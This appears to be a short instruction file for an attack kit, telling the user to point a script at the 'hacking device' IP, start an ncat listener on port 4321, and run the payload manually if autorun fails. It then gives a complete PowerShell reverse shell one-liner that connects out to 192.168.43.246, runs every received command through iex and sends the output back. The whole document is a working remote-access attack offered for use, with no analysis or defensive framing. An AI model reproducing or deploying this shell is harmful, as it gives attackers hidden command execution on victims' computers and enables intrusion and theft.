INSTRUCTIONS:

configure host in linux shell script to ip of hacking device to connect back from the target device
use 'ncat -lvp 4321' to start listener
if autorun doesn't work run lnx shell script manually




$client = New-Object System.Net.Sockets.TCPClient("192.168.43.246",4321);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
